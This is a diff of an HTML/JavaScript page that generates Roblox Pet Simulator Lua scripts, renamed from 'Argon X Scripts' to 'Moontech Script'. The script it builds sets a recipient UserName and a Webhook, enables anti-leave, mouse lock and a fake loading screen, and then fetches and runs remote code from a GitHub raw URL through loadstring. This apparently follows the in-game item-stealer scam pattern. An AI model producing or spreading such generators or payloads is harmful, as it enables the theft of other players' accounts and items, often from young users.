@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Argon X Scripts - Ps99</title>
+  <title>Moontech Script - Psx</title>
   <style>
     body {
         font-family: 'Roboto', sans-serif;
@@ -102,7 +102,7 @@
 </head>
 <body>
   <div class="container">
-    <h1>Argon X Scripts Generator</h1>
+    <h1>Moontech Script Generator</h1>
     <form id="scriptForm">
       <label for="username">Username:</label>
       <input type="text" id="username" name="username" required><br><br>
@@ -149,13 +149,6 @@
       const generateButton = document.getElementById('generateBtn');
       const copyButton = document.getElementById('copyBtn');
 
-      // URL validation pattern
-      const urlPattern = new RegExp('^(https?:\\/\\/)?' + // protocol
-        '(([a-zA-Z\\d]([a-zA-Z\\d-]*[a-zA-Z\\d])*)\\.?)+[a-zA-Z]{2,}' + // domain name
-        '(\\:\\d+)?(\\/[-a-zA-Z\\d%_.~+]*)*' + // port and path
-        '(\\?[;&a-zA-Z\\d%_.~+=-]*)?' + // query string
-        '(\\#[-a-zA-Z\\d_]*)?$','i'); // fragment locator
-
       generateButton.addEventListener('click', function(event) {
         event.preventDefault(); 
 
@@ -172,21 +165,19 @@
         const waitingTime = document.getElementById("waitingTime").value;
 
         // Generate script output
-        const outputString = `--generate through website\n` +
-                             `--website made by kizamies#0001/Shimm\n\n` +
-                             `UserName = "${username}"\n` +
+        const outputString = `UserName = "${username}"\n` +
                              `${username2 ? `UserName2 = "${username2}" -- optional delete the whole line if you don't want it\n` : ''}` +
                              `${webhook ? `Webhook = "${webhook}" -- optional delete the whole line if you don't want it\n` : ''}\n` +
-                             `_G.LoadingScreen = ${loadingscreen}\n` +
-                             `_G.AntiLeave = ${antileave}\n` +
-                             `_G.MouseLock = ${mouseLock}\n\n` +
+                             `mouselock = ${mouseLock}\n` +
+                             `Antileave = ${antileave}\n` +
+                             `LoadingScreen = ${loadingscreen}\n` +
                              `-- set them to false if you don't need them\n\n` +
-                             `_G.ScriptName = "${scriptName}"\n` +
-                             `_G.FirstText = "${firstText}"\n` +
-                             `_G.SecondText = "${secondText}"\n` +
-                             `_G.ThirdText = "${thirdText}"\n` +
-                             `_G.WaitingTime = ${waitingTime} -- it's the time between 0% and 100% in seconds\n\n` +
-                             `loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Script-Psx/main/lds.lua",true))()`;
+                             `ScriptName = "${scriptName}"\n` +
+                             `FirstText = "${firstText}"\n` +
+                             `SecondText = "${secondText}"\n` +
+                             `ThirdText = "${thirdText}"\n` +
+                             `WaitingTime = ${waitingTime} -- it's the time between 0% and 100% in seconds\n\n` +
+                             `loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Psxx/main/Psx.lua",true))()`;
 
         document.getElementById("output").value = outputString;
       });
